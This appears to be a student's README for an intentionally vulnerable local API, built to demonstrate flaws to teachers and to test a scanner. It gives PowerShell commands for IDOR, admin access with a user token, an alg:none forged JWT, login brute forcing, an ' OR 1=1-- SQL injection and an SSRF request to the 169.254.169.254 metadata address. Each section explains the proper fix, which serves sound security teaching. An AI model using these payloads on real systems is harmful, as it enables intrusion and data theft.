# Vulnerable API Manual Demo Guide (Windows PowerShell)

This API is intentionally insecure and is built only for demo/scanner testing.

## Goal of this README
- Show exactly how to run manual tests in front of teachers.
- Show what is wrong in this API.
- Show expected status codes and response behavior for each vulnerability.

## Run the API
Open a PowerShell window:

```powershell
cd C:\Users\ashis\OneDrive\Desktop\RSOC26\vulnerable-api
npm install
node index.js
```

Base URL: `http://localhost:3001`

Demo users:
- `alice@example.com / password123` (user)
- `bob@example.com / password123` (user)
- `admin@example.com / password123` (admin)

---

## Quick test setup (copy-paste once)
Open a second PowerShell window for testing:

```powershell
$base = "http://localhost:3001"

$loginBody = @{
  email = "alice@example.com"
  password = "password123"
} | ConvertTo-Json

$login = Invoke-RestMethod -Method Post -Uri "$base/api/auth/login" -ContentType "application/json" -Body $loginBody
$token = $login.token

"Alice token: $token"
```

If token prints, setup is ready.

---

## 1) BOLA / IDOR
### Command
```powershell
Invoke-RestMethod -Method Get -Uri "$base/api/users/1" -Headers @{ Authorization = "Bearer $token" }
Invoke-RestMethod -Method Get -Uri "$base/api/users/2" -Headers @{ Authorization = "Bearer $token" }
Invoke-RestMethod -Method Get -Uri "$base/api/users/3" -Headers @{ Authorization = "Bearer $token" }
```

### Expected in vulnerable-api
- All calls succeed (`200` behavior).
- Alice token can read Bob/Admin data.

### Why this is wrong
- Same token should not access other users' objects.
- Proper API should return `403 Forbidden` for `/users/2` and `/users/3`.

---

## 2) Vertical privilege escalation (user -> admin)
### Command
```powershell
Invoke-RestMethod -Method Get -Uri "$base/api/admin/users" -Headers @{ Authorization = "Bearer $token" }
```

### Expected in vulnerable-api
- Returns admin user list (`200` behavior).

### Why this is wrong
- User token must not access admin endpoint.
- Proper API should return `403`.

---

## 3) Broken authentication / JWT checks

### 3.1 Missing token
```powershell
try {
  Invoke-RestMethod -Method Get -Uri "$base/api/profile"
} catch {
  $_.Exception.Response.StatusCode.value__
}
```
Expected: `401` (this part works).

### 3.2 Malformed token accepted (bad)
```powershell
Invoke-RestMethod -Method Get -Uri "$base/api/profile" -Headers @{ Authorization = "Bearer malformed.token.value" }
```
Expected in vulnerable-api: accepted (`200` behavior) due to insecure decode-only auth.

### 3.3 `alg:none` token accepted (bad)
```powershell
$algNone = "eyJhbGciOiJub25lIn0.eyJpZCI6MiwiZW1haWwiOiJib2JAZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciJ9."
Invoke-RestMethod -Method Get -Uri "$base/api/profile" -Headers @{ Authorization = "Bearer $algNone" }
```
Expected in vulnerable-api: accepted (`200` behavior).

### Why this is wrong
- Token signature is not properly verified.
- Proper API should reject malformed/forged tokens with `401`.

---

## 4) No rate limiting on login
### Command
```powershell
1..30 | ForEach-Object {
  $body = @{ email="alice@example.com"; password="wrongpass" } | ConvertTo-Json
  try {
    Invoke-RestMethod -Method Post -Uri "$base/api/auth/login" -ContentType "application/json" -Body $body | Out-Null
    200
  } catch {
    $_.Exception.Response.StatusCode.value__
  }
}
```

### Expected in vulnerable-api
- Mostly `401` repeated.
- No `429 Too Many Requests`.

### Why this is wrong
- Brute-force protection missing.
- Proper API should return `429` after few failed attempts.

---

## 5) Sensitive data exposure
### Command
```powershell
Invoke-RestMethod -Method Get -Uri "$base/api/users"
```

### Expected in vulnerable-api
- Response includes sensitive fields like:
  - `password`
  - `ssn`
  - `credit_card`
  - detailed PII

### Why this is wrong
- API should return minimum required fields only.

---

## 6) SQL injection behavior
### Command
```powershell
Invoke-RestMethod -Method Get -Uri "$base/api/products?q=' OR 1=1--"
```

### Expected in vulnerable-api
- Query string is directly injected into SQL.
- You may see manipulated results and/or DB error leakage.

### Why this is wrong
- Input concatenation in SQL is unsafe.
- Proper API should use parameterized queries.

---

## 7) SSRF-style unsafe fetch
### Command
```powershell
try {
  Invoke-RestMethod -Method Get -Uri "$base/api/fetch?url=http://169.254.169.254/latest/meta-data/"
} catch {
  $_.ErrorDetails.Message
}
```

### Expected in vulnerable-api
- Backend attempts internal URL fetch.
- Error/attempt details may leak.

### Why this is wrong
- Internal metadata IPs should be blocked by policy.

---

## 8) Quick summary for teacher
- This API intentionally returns `200` where it should be `403/401`.
- It leaks data and lacks controls (authZ, rate limiting, SQLi/SSRF protections).
- Scanner should flag high/critical issues on this target.
